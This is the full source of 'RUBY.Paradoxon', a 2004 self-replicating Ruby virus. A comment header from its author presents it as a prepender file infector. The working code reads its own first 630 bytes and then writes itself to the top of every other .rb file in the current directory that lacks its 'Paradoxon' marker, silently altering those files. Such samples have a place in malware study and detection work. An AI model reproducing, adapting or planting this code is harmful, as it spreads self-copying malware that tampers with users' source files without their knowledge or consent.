#  RUBY.Paradoxon
#  by Second Part To Hell
#  www.spth.de.vu
#  spth@priest.com
#  written in november 2004
#  in Austria (as a free world citizen)
#
#  The virus you can see now is, as the name already says, a RUBY file infector.
#  You may ask, what the hell is RUBY? Well, it's a web-based script language from
#  japan, where it is very famous and often used. I've read about that language
#  in a Linux Magazine (with the special Knoppix 3.6-scripting edition CD), and I
#  wanted to try it (write a virus for it). OK, I've downloaded the Installation
#  pack (http://www.geocities.co.jp/SiliconValley-PaloAlto/9251/ruby/main.html) for
#  Ruby 1.8.1.2 and the 'Ruby Language Reference Manual'. Then i've started to learn
#  it, and soon I've understood the main parts of the syntax, some important methods
#  and objects and so on. And as a result of my work, you can find the virus here.
#
#  RUBY.Paradoxon is a prepender-virus, which infects all .rb (Ruby) files in the
#  current directory. It doesn't harm the host in any way nor it has any other payload.
#
#  I'm going to write one advanced Ruby virus and write a tutorial about Ruby-infections
#  soon. I've named my virus Paradoxon, because the existence of such a virus is very
#  strange. I hope you enjoy the little trip into a world, nobody has ever met before :)
#
#
# RUBY.Paradoxon
mycode=File.open(__FILE__).read(630)
cdir = Dir.open(Dir.getwd)
  cdir.each do |a|
    if File.ftype(a)=="file" then
      if a[a.length-3, a.length]==".rb" then
        if a!=File.basename(__FILE__) then
          fcode=""
          fle=open(a)
          spth=fle.read(1)
          while spth!=nil
            fcode+=spth
            spth=fle.read(1)
          end
          fle.close
          if fcode[7,9]!="Paradoxon" then
            fcode=mycode+13.chr+10.chr+fcode
            fle=open(a,"w")
              fle.print fcode
            fle.close
          end
        end
      end
    end
  end
cdir.close